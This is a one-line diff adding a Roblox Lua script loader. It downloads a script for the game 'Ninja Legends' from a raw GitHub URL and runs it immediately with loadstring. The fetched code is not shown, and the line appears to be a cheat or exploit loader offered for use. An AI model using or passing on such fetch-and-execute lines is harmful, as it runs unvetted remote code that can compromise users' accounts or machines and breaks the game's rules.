@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/theyin345/Roblox/refs/heads/main/best-ningalegends-en.lua"))()
